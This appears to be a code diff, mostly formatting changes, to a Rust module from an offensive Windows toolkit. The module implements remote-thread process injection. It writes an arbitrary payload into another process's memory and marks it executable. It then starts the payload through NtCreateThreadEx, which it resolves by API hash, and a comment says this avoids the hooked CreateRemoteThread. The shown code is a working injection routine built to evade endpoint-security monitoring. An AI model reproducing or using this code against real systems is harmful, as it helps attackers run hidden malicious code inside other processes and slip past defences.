@@ -1,37 +1,62 @@
-use anyhow::{anyhow, Result};
 use crate::injection::Injector;
+use anyhow::{anyhow, Result};
 
 pub struct RemoteThreadInjector;
 
 #[cfg(windows)]
 impl Injector for RemoteThreadInjector {
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
-        use winapi::um::processthreadsapi::OpenProcess;
-        use winapi::um::winnt::{PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_CREATE_THREAD};
-        use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
-        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
         use winapi::um::handleapi::CloseHandle;
+        use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
+        use winapi::um::processthreadsapi::OpenProcess;
+        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
+        use winapi::um::winnt::{PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_WRITE};
 
         unsafe {
-            let h_proc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, 0, pid);
-            if h_proc.is_null() { return Err(anyhow!("RemoteThread: OpenProcess failed")); }
+            let h_proc = OpenProcess(
+                PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
+                0,
+                pid,
+            );
+            if h_proc.is_null() {
+                return Err(anyhow!("RemoteThread: OpenProcess failed"));
+            }
 
             // Allocate RW first; switch to RX after writing to avoid RWX pages
-            let remote_mem = VirtualAllocEx(h_proc, std::ptr::null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            let remote_mem = VirtualAllocEx(
+                h_proc,
+                std::ptr::null_mut(),
+                payload.len(),
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_READWRITE,
+            );
             if remote_mem.is_null() {
                 CloseHandle(h_proc);
                 return Err(anyhow!("RemoteThread: VirtualAllocEx failed"));
             }
 
             let mut written = 0usize;
-            if WriteProcessMemory(h_proc, remote_mem, payload.as_ptr() as _, payload.len(), &mut written) == 0 {
+            if WriteProcessMemory(
+                h_proc,
+                remote_mem,
+                payload.as_ptr() as _,
+                payload.len(),
+                &mut written,
+            ) == 0
+            {
                 CloseHandle(h_proc);
                 return Err(anyhow!("RemoteThread: WriteProcessMemory failed"));
             }
 
             // Switch to execute-read (no write)
             let mut old_prot = 0u32;
-            VirtualProtectEx(h_proc, remote_mem, payload.len(), PAGE_EXECUTE_READ, &mut old_prot);
+            VirtualProtectEx(
+                h_proc,
+                remote_mem,
+                payload.len(),
+                PAGE_EXECUTE_READ,
+                &mut old_prot,
+            );
 
             // Use NtCreateThreadEx via pe_resolve to avoid the hooked CreateRemoteThread.
             let ntdll_hash = pe_resolve::hash_str(b"ntdll.dll\0");
@@ -39,23 +64,48 @@ impl Injector for RemoteThreadInjector {
                 .ok_or_else(|| anyhow!("RemoteThread: ntdll not found"))?;
             let fn_hash = pe_resolve::hash_str(b"NtCreateThreadEx\0");
             let fn_ptr = pe_resolve::get_proc_address_by_hash(ntdll, fn_hash)
-                .ok_or_else(|| anyhow!("RemoteThread: NtCreateThreadEx not found"))? as *mut winapi::ctypes::c_void;
+                .ok_or_else(|| anyhow!("RemoteThread: NtCreateThreadEx not found"))?
+                as *mut winapi::ctypes::c_void;
 
             type NtCreateThreadExFn = unsafe extern "system" fn(
-                *mut *mut winapi::ctypes::c_void, u32,
-                *mut winapi::ctypes::c_void, *mut winapi::ctypes::c_void,
-                *mut winapi::ctypes::c_void, *mut winapi::ctypes::c_void,
-                u32, usize, usize, usize, *mut winapi::ctypes::c_void,
+                *mut *mut winapi::ctypes::c_void,
+                u32,
+                *mut winapi::ctypes::c_void,
+                *mut winapi::ctypes::c_void,
+                *mut winapi::ctypes::c_void,
+                *mut winapi::ctypes::c_void,
+                u32,
+                usize,
+                usize,
+                usize,
+                *mut winapi::ctypes::c_void,
             ) -> i32;
             let nt_create: NtCreateThreadExFn = std::mem::transmute(fn_ptr);
 
             let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
-            let status = nt_create(&mut h_thread, 0x1FFFFF, std::ptr::null_mut(), h_proc, remote_mem, std::ptr::null_mut(), 0, 0, 0, 0, std::ptr::null_mut());
+            let status = nt_create(
+                &mut h_thread,
+                0x1FFFFF,
+                std::ptr::null_mut(),
+                h_proc,
+                remote_mem,
+                std::ptr::null_mut(),
+                0,
+                0,
+                0,
+                0,
+                std::ptr::null_mut(),
+            );
             if status < 0 {
                 CloseHandle(h_proc);
-                return Err(anyhow!("RemoteThread: NtCreateThreadEx failed: {:x}", status));
+                return Err(anyhow!(
+                    "RemoteThread: NtCreateThreadEx failed: {:x}",
+                    status
+                ));
             }
-            if !h_thread.is_null() { CloseHandle(h_thread); }
+            if !h_thread.is_null() {
+                CloseHandle(h_thread);
+            }
             CloseHandle(h_proc);
         }
         Ok(())
